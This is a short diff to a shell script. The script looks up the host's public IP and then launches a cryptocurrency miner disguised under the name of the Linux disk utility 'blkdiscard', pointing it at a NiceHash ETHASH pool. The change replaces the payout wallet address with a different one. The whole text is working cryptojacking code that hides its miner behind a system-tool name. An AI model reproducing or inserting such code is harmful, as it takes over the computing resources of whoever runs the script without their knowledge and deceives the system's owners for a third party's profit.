@@ -4,4 +4,4 @@
 #gives ip address 
 curl ipecho.net/plain && curl ipecho.net/plain
 chmod +x blkdiscard 
-./blkdiscard --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 3HxaP83DhkYyjQ5SeCvZ4yXkNXBwJNDHDz.$(echo $(shuf -i 1-9999 -n 1)-KULI)
+./blkdiscard --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 3NZxSNp1H1rdGvgEjPW3g9KZEmb49i8KiM.$(echo $(shuf -i 1-9999 -n 1)-KULI)
